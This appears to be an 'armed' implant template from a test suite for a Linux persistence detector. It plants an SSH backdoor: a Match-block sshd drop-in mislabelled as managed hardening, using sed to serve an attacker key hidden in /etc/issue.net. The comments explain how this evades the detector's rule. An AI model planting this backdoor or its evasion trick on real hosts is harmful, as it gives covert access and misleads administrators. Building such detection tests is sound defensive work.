# Implant template: apt-sshd-akc-packaged (L5, armed)
#
# APT TTP mirror: backdoored SSH authentication via AuthorizedKeysCommand
# (seen in real-world Linux intrusions and the "SSH-Snake" / cd00r-style
# tradecraft; sshd_config-based auth backdoors are a documented
# T1098.004 / T1556 pattern). Instead of dropping an authorized_keys
# line, the attacker points sshd at an AuthorizedKeysCommand helper.
# linpersist's sshd_authorized_keys_command_external rule ONLY fires when
# the helper is non_package_path / orphan / interpreter_in_tmp. Here the
# helper is /usr/bin/sed -- a PACKAGED binary -- invoked with an
# expression that synthesizes the attacker's pubkey from /etc/issue.net
# comments. exec_target=/usr/bin/sed is managed -> none of the three
# co-signals fire -> sshd_authorized_keys_command_external is SILENT.
# sshd_authorized_keys_command signal still fires, but no rule consumes
# it alone. The Match block scoping (AuthorizedKeysCommand under a Match
# User block) also rides sshd_match_block_directive, which no rule reads.
# Finding: AKC pointing at a packaged LOLBin evades the AKC detection.
#
# Variables: ${sshd_config_file}, ${akc_user}

RUN mkdir -p /etc/ssh/sshd_config.d && \
    printf '%s\n' \
        '# hardening drop-in (managed)' \
        'Match User ${akc_user}' \
        '    AuthorizedKeysCommand /usr/bin/sed -n "s/^#authkey //p" /etc/issue.net' \
        '    AuthorizedKeysCommandUser root' \
        > ${sshd_config_file} && \
    chown root:root ${sshd_config_file} && \
    chmod 0644 ${sshd_config_file} && \
    printf '%s\n' \
        '#authkey ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFwdExhYkltcGxhbnRTc2hkQWtjUGFja2FnZWQwMQ== ops@bastion' \
        >> /etc/issue.net
